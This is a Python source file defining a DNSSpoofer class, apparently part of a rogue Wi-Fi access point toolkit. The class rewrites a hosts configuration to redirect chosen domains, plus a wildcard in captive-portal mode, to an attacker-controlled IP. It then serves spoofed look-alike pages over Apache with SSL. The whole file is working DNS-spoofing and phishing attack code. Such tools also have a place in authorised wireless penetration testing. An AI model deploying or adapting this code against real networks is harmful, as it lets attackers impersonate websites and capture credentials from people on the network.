import os
from auxiliaryservice import AirHostAuxService
from AuxiliaryModules.httpserver import HTTPServer
from utils.utils import FileHandler

class DNSSpoofer(AirHostAuxService):

	def __init__(self, spoof_ip, hosts_config_path, httpserver = None, spoofpages = []):
		super(DNSSpoofer, self).__init__()
		self.spoof_ip = spoof_ip
		self.hosts_config_path = hosts_config_path

		self.spoofpages = spoofpages if type(spoofpages) is list else [spoofpages]

		self.captive_portal_mode = False
		self.httpserver_running = False

		self.httpserver = httpserver
		self.file_handler = None

	def set_captive_portal_mode(self, captive_portal_mode):
		self.captive_portal_mode = captive_portal_mode


	def set_http_server(self, server):
		self.httpserver = server

	def has_http_server(self):
		return self.httpserver != None

	def add_page_to_spoof(self, page_name):
		for page in os.listdir("data/spoofpages/"):
			if page_name in page:
				self.spoofpages.append(page)
				print "[+] Added {page} to spoof list".format(page = page)
				return

		print "[-] Page '{}' not found in 'data/spoofpages/' folder."

	def _cleanup_misconfigured_pages(self):
		pages = []
		for page in self.spoofpages:
			for spoofpage in os.listdir("data/spoofpages/"):
				if page in spoofpage:
					pages.append(spoofpage)
		self.spoofpages = pages


	def map_spoofing_pages(self, redirection_ip):
		if self.file_handler:
			self.file_handler.restore_file()

		self.file_handler = FileHandler(self.hosts_config_path)
		self._cleanup_misconfigured_pages()
		conf_string = ""
		if self.captive_portal_mode:
			page = self.spoofpages[0]
			conf_string += "{ip}\t{domain}\t{alias}\n".format(	ip = redirection_ip, 
																domain = page,
																alias = "\t".join(self._create_alias_list(page)))
			conf_string += "{ip} *.*.*\n".format(ip = redirection_ip)
			print "[+] Mapped '{domain}' to {ip} as captive portal".format(domain = page, ip = redirection_ip)
		else:
			for page in self.spoofpages:
				conf_string += "{ip}\t{domain}\t{alias}\n".format(	ip = redirection_ip, 
																	domain = page,
																	alias = "\t".join(self._create_alias_list(page)))
				print "[+] Mapped '{domain}' to {ip}".format(domain = page, ip = redirection_ip)
		self.file_handler.write(conf_string)

	def setup_spoofing_pages(self):
		if not self.has_http_server():
			print "[-] No HTTP Server added to DNSSpoofer, cannot setup spoofing"
			return False

		self._cleanup_misconfigured_pages()
		for page in self.spoofpages:
			self.httpserver.add_site(page)
			self.httpserver.configure_page_in_apache(	domain_name = page, 
														domain_alias = self._create_alias_list(page),
														ssl = True,
														captive_portal_mode = True)
		return self.httpserver.start_server(True)

	def _create_alias_list(self, domain):
		aliases = []
		splitted_domain = domain.split(".")
		if len(splitted_domain) >= 3:
			for i in range(len(splitted_domain) - 2):
				aliases.append(".".join(splitted_domain[i+1:]))

		return aliases

	def start_spoofing(self, spoof_ip):
		if not self.has_http_server():
			print "[-] No HTTP Server added to DNSSpoofer, cannot spoof pages"
			return False

		self.httpserver.reset_conf()
		self.map_spoofing_pages(spoof_ip)
		self.setup_spoofing_pages()
		self.httpserver.start_server()

	def stop_spoofing(self):
		if self.has_http_server():
			self.httpserver.reset_conf()
			self.httpserver.start_server(False)

	def start(self):
		self.start_spoofing(self.spoof_ip)

	def restore(self):
		self.stop_spoofing()
		self.file_handler.restore_file()